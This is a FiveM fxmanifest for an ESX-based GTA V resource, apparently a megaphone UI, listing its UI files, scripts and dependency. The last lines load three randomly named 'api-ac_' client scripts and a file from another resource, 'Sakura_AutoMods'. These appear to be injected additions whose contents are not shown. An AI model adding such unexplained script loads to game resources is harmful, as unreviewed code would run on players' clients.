fx_version 'bodacious'
games { 'gta5' }



ui_page "html/ui.html"

files {
	"html/ui.html",
	"html/index.js",
	

	"html/megaphone.png",
	"html/test.gif",
	"html/test.svg"
}


client_scripts {

	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua',

}

server_scripts {

	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'


}

dependencies {

    'es_extended',

}






client_script "api-ac_MSixQhPKmCnf.lua"
client_script "api-ac_xUkMANoRzPVS.lua"
client_script "api-ac_IaWDYjheHvJp.lua"


client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'